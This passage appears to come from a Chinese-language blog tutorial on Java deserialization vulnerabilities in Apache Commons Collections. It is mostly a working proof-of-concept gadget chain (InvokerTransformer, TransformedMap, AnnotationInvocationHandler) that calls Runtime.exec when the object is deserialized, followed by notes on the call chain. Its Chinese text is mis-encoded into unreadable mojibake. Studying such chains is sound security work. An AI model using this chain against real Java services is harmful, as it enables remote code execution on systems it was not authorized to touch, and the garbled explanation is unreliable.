Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map map = new HashMap(); map.put(\"value\", \"value\"); Map transformedMap = TransformedMap.decorate(map, null, transformerChain); Class cl = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class); ctor.setAccessible(true); Object instance = ctor.newInstance(java.lang.annotation.Target.class, transformedMap); //Object instance = ctor.newInstance(java.lang.annotation.Retention.class, transformedMap); //åºåˆ—åŒ– FileOutputStream fileOutputStream = new FileOutputStream(\"serialize3.txt\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(instance); objectOutputStream.close(); //ååºåˆ—åŒ– FileInputStream fileInputStream = new FileInputStream(\"serialize3.txt\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); Object result = objectInputStream.readObject(); objectInputStream.close(); System.out.println(result); }} java.lang.Runtime#exec(java.lang.String)åœ¨execå¤„æ·»åŠ æ–­ç‚¹ æŸ¥çœ‹è°ƒç”¨é“¾ sun.reflect.annotation.AnnotationInvocationHandler#readObject ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•° var1 å¿…é¡»ä¸ºç»§æ‰¿Annotationçš„å­ç±»ï¼ŒAnnotationè¿™ä¸ªæŽ¥å£æ˜¯æ‰€æœ‰æ³¨è§£ç±»åž‹çš„å…¬ç”¨æŽ¥å£ï¼Œæ‰€æœ‰æ³¨è§£ç±»åž‹éƒ½å®žçŽ°äº†è¿™ä¸ªæŽ¥å£ã€‚ java.lang.annotation.Retention.class java.lang.annotation.Target.class å¦åˆ™åœ¨è¿™ä¸ªåœ°æ–¹å°±returnï¼Œä¸ä¼šç»§ç»­å‘ä¸‹æ‰§è¡Œäº† ä¼ å…¥çš„ç¬¬äºŒä¸ªå‚æ•° var2 åˆ™æ˜¯æž„é€ çš„è°ƒç”¨é“¾åŒæ—¶mapçš„é”®å€¼å¿…é¡»ä¸º\"value\"ï¼Œå¦åˆ™åˆ©ç”¨ä¸æˆåŠŸï¼Œè¿™æ˜¯ä¸€å¤„å°ç»†èŠ‚~ Java ååºåˆ—åŒ–æ¼æ´žå§‹æœ«ï¼ˆ1ï¼‰â€” Apache Commonsæµ…æ˜¾æ˜“æ‡‚çš„JAVAååºåˆ—åŒ–å…¥é—¨æ‰‹æŠŠæ‰‹æ•™ä½ å†™JAVAååºåˆ—åŒ–çš„POC document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]}],"categories":[],"tags":[]}